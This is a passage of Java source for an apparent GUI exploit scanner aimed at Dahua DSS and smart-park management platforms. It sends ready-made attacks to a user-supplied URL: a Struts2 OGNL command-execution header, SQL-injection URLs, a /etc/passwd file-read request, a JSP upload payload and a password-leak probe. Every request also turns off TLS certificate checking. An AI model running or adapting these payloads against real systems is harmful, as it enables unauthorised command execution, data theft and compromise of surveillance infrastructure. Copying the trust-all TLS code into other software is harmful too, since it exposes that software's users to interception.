            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //    response.append(inputLine);
            //    test1.appendText(response.toString());
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);


                //    test1.appendText(response.toString());
            }


            //  int responseCode = connection.getResponseCode();
            if (response.toString().contains("password")) {

                test1.appendText(formattedDateTime + "[+]存在大华DSS user_edit.action信息泄露漏洞" + "\n");
                test1.appendText(formattedDateTime + url + "/admin/cascade_/user_edit.action?id=1" + "\n");

            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华DSS user_edit.action信息泄露漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华DSS user_edit.action信息泄露漏洞" + "\n");


        }


    }

    public void rce10() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);

            }

            //StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //   while ((inputLine = br.readLine()) != null) {

            //      response.append(inputLine);


            //    test1.appendText(response.toString());
            //    }


            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String line;
                StringBuilder errorResponse2 = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResponse2.append(line);
                }

                if (errorResponse2.toString().contains("No such operation")) {

                    test1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
                    //   test1.appendText(formattedDateTime +url+"/admin/cascade_/user_edit.action?id=1" + "\n");
                }


            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞-" + "\n");
            System.out.println(e);


        }


    }

    public void rc12() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        if (!isValidUrl(url)) cmd.appendText("输入的不是有效的网址" + "\n");
        else {
            // if (!isValidUrl(url)) {
            //       test1.appendText("输入的不是有效的网址" + "\n");
            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
            //  } else {


            try {

                HostnameVerifier hv = new HostnameVerifier() {
                    @Override
                    public boolean verify(String urlHostName, SSLSession session) {
                        return true;
                    }
                };

                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
                SSLContext sc = SSLContext.getInstance("SSL");
                SSLSessionContext sslsc = sc.getServerSessionContext();
                sslsc.setSessionTimeout(0);
                sc.init(null, trustAllCerts, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

                HttpsURLConnection.setDefaultHostnameVerifier(hv);
                // System.setProperty("http.proxyHost", "127.0.0.1");
                //   System.setProperty("http.proxyPort", "8080");
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                URL url1 = new URL(url + "/admin/login_login.action");
                String json = "";
                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo test').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();
                os.write(input, 0, input.length);
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                String inputLine;
                response.append(inputLine = br.readLine());
                while ((inputLine = br.readLine()) != null) {
                }
                response.append(inputLine);
                //    test1.appendText(response.toString());
                if (response.toString().contains("test")) {

                    cmd.appendText(formattedDateTime + "[+]存在大华DSS数字监控系统远程命令执行漏洞" + "\n");

                } else {

                    cmd.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统远程命令执行漏洞" + "\n");
                }


            } catch (Exception e) {
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                cmd.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统远程命令执行漏洞" + "\n");
            }


        }
    }

    public void rc15() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            //  BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            //   StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //    response.append(inputLine);
            //    test1.appendText(response.toString());
            //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            //StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //   while ((inputLine = br.readLine()) != null) {

            //      response.append(inputLine);


            //    test1.appendText(response.toString());
            //    }


            int responseCode = connection.getResponseCode();
            if (responseCode == 500) {

                cmd1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
                //   test1.appendText(formattedDateTime +url+"/admin/cascade_/user_edit.action?id=1" + "\n");

            } else {

                cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");


        }


    }

    public void rce19() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }

            URL url1 = new URL(url + "/publishing/publishing/material/file/video");

        } catch (Exception e) {

        }
    }

    public void rce20() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1)--%22%7D/extend/%7B%7D");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            //     BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            //  String inputLine;


            int responseCode = connection.getResponseCode();

            if (responseCode == 500) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String line;
                StringBuilder errorResponse = new StringBuilder();
                while ((line = errorReader.readLine()) != null) {
                    errorResponse.append(line);
                }

                //   test1.appendText(errorResponse.toString());

                if (errorResponse.toString().contains("e10adc3949ba59abbe56e057f20f883")) {


                    test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台searchJson注入漏洞" + "\n");
                    test1.appendText(formattedDateTime + url + "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D" + "\n");
                }


            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台searchJson注入漏洞" + "\n");
            }


            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //    response.append(inputLine);
            //    test1.appendText(response.toString());
            //    BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));


            //    String inputLine;
            //   response.append(inputLine = br.readLine());
            //   while ((inputLine = br.readLine()) != null) {

            //      response.append(inputLine);


            //    test1.appendText(response.toString());
            //    }


            //   int responseCode = connection.getResponseCode();


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台searchJson注入漏洞" + "\n");


        }


    }

    public void rce21() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd ");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
            }
            int responseCode = connection.getResponseCode();
            //      test1.appendText(response.toString());

            if (responseCode == 200) {

                test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台任意文件读取漏洞" + "\n");
                test1.appendText(formattedDateTime + url + "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd" + "\n");
            }


            //   test1.appendText(errorResponse.toString());


            //    test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台任意文件读取漏洞" + "\n");
            //    test1.appendText(formattedDateTime +url+"/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd" + "\n");

            else {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台任意文件读取漏洞" + "\n");
            }


            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //    response.append(inputLine);
            //    test1.appendText(response.toString());
            //    BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));


            //    String inputLine;
            //   response.append(inputLine = br.readLine());
            //   while ((inputLine = br.readLine()) != null) {

            //      response.append(inputLine);


            //    test1.appendText(response.toString());
            //    }


            //   int responseCode = connection.getResponseCode();


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台任意文件读取漏洞" + "\n");


        }

    }

    public void dailipeizhi() {

        try {


            if (url1.getText().isEmpty()) {

                url6.setText("代理未配置");


            } else {


                System.setProperty("http.proxyHost", url1.getText());
                System.setProperty("http.proxyPort", url2.getText());
                url6.setText("已配置");


            }

        } catch (Exception e) {

            e.printStackTrace();

        }


    }

    public void video() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8081");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/publishing/publishing/material/file/video");
            String boundary = "<%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>";
            String fileData = "test";
            String file = "file";
            String submit = "submit";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Filedata\"; filename=\"index.jsp\"\r\n\r\n");
            outputStream.writeBytes(fileData + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"\r\n\r\n");
            outputStream.writeBytes(file + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Submit\"\r\n\r\n");
            outputStream.writeBytes(submit + "\r\n");

            outputStream.writeBytes("--" + boundary + "--\r\n");

            outputStream.flush();
            outputStream.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //   response.append(inputLine);
            // }


            int responseCode = connection.getResponseCode();
            System.out.println("Response Code: " + responseCode);


            if (response.toString().contains("path")) {

                test1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");

            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");


                //     upload();

            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");
            System.out.println(e);
        }

    }

    public void upload() {


        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + url9.getText());
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
            }
            int responseCode = connection.getResponseCode();
            if (response.toString().contains("12321")) {

                test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");


            } else {
                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");

            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");
        }

    }


    public void emap() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/emap/devicePoint_addImgIco?hasSubsystem=true");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
            }
            int responseCode = connection.getResponseCode();
            if (response.toString().contains("上传图片失败！")) {

                test1.appendText(formattedDateTime + "[+]可能存在大华智慧园区综合管理平台emap任意文件上传漏洞" + "\n");


            } else {
                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台emap任意文件上传漏洞" + "\n");

            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台emap任意文件上传漏洞" + "\n");
            //  System.out.println(e);
        }


    }

    public void get() {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/portal/attachment_getAttList.action?bean.TabName=1&bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {

                response.append(inputLine);
            }
            int responseCode = connection.getResponseCode();
            if (response.toString().contains("qkkkq1qxxbq")) {

                test1.appendText(formattedDateTime + "[+]存在大华DSS数字监控系统attachment_getAttList.action注入漏洞" + "\n");
                test1.appendText(formattedDateTime + url + "/portal/attachment_getAttList.action?bean.TabName=1&bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO" + "\n");

            } else {
                test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统attachment_getAttList.action注入漏洞" + "\n");

            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            test1.appendText(formattedDateTime + "[-]不存在大华DSS数字监控系统attachment_getAttList.action注入漏洞" + "\n");
        }

    }

    public void login() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        if (!isValidUrl(url)) cmd.appendText("输入的不是有效的网址" + "\n");
        else {
            // if (!isValidUrl(url)) {
            //       test1.appendText("输入的不是有效的网址" + "\n");
            //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
            //  } else {


            try {

                HostnameVerifier hv = new HostnameVerifier() {
                    @Override
                    public boolean verify(String urlHostName, SSLSession session) {
                        return true;
                    }
                };

                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
                SSLContext sc = SSLContext.getInstance("SSL");
                SSLSessionContext sslsc = sc.getServerSessionContext();
                sslsc.setSessionTimeout(0);
                sc.init(null, trustAllCerts, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

                HttpsURLConnection.setDefaultHostnameVerifier(hv);
                // System.setProperty("http.proxyHost", "127.0.0.1");
                //   System.setProperty("http.proxyPort", "8080");
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                URL url1 = new URL(url + "/evo-apigw/evo-oauth/oauth/token");
                String json = "username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=";
                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();
                os.write(input, 0, input.length);
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                String inputLine;
                response.append(inputLine = br.readLine());
                while ((inputLine = br.readLine()) != null) {
                }
                response.append(inputLine);
                //    test1.appendText(response.toString());
